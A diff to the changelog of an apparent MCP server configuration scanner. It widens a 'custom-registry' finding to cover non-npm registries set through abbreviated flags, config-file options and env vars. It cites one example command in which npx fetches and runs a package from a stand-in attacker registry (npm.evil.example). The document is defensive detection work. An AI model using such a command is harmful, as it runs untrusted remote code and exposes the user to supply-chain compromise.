@@ -7,7 +7,7 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).
 ## [Unreleased]
 
 ### Added
-- `custom-registry` finding: an `npx` or `npm exec` server that installs from a registry other than the npm registry (`--registry`, `--@scope:registry`, or `npm_config_registry` / `npm_config_@scope:registry` in the server's env, any key case) is now flagged, HIGH for plain http, MEDIUM otherwise. Before, `npx --registry=https://npm.evil.example -y @modelcontextprotocol/server-filesystem` was reported as an official server. A custom registry now also skips the name allowlists and the npmjs provenance lookup, since both describe the npm registry's copy, not the one that runs. Known-malicious names are still blocked.
+- `custom-registry` finding: an `npx` or `npm exec` server that installs from a registry other than the npm registry (`--registry` or any prefix npm accepts such as `--reg`, `--@scope:registry`, or `npm_config_registry` / `npm_config_@scope:registry` in the server's env, any key case) is now flagged, HIGH for plain http, MEDIUM otherwise. A `--userconfig`, `--globalconfig` or `--prefix` flag (or its `npm_config_` env) is flagged MEDIUM too, since that file can set the registry. For `npx`, a `--registry` after the package belongs to the server and is ignored. Before, `npx --registry=https://npm.evil.example -y @modelcontextprotocol/server-filesystem` was reported as an official server. A custom registry now also skips the name allowlists and the npmjs provenance lookup, since both describe the npm registry's copy, not the one that runs. Known-malicious names are still blocked.
 
 ## [2.2.0] - 2026-10-25
 
